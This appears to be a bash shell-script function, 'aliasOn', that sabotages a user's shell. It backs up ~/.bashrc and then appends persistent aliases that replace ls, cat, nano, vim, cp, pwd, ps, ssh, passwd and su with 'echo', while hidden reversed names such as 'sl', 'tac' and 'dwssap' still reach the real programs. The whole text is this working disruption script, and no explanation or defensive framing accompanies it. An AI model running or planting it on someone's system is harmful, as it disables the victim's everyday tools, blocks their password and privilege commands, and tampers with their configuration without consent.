aliasOn() {
sudo mkdir ~/.backup
alias alien='source ~/.bashrc'
echo "alias alien='source ~/.bashrc'" >> ~/.bashrc
sudo cp ~/.bashrc ~/.backup/
echo "alias sl=/bin/ls" >> ~/.bashrc
echo "alias ls='echo'" >> ~/.bashrc
echo "alias cat='echo'" >> ~/.bashrc
echo "alias tac=/bin/cat" >> ~/.bashrc
echo "alias nano='echo'" >> ~/.bashrc
echo "alias onan=/bin/nano" >> ~/.bashrc
echo "alias vim='echo'" >> ~/.bashrc
echo "alias miv=/bin/vim" >> ~/.bashrc
echo "alias cp='echo'" >> ~/.bashrc
echo "alias pc=/bin/cp" >> ~/.bashrc
echo "alias pwd='echo'" >> ~/.bashrc
echo "alias dwp=/bin/pwd" >> ~/.bashrc
echo "alias ps='echo'" >> ~/.bashrc
echo "alias sp=/bin/ps" >> ~/.bashrc
echo "alias ssh='echo'" >> ~/.bashrc
echo "alias hss=/bin/ssh" >> ~/.bashrc
echo "alias passwd='echo'" >> ~/.bashrc
echo "alias dwssap=/bin/passwd" >> ~/.bashrc
echo "alias su='echo'" >> ~/.bashrc
echo "alias us=/bin/su" >> ~/.bashrc
}
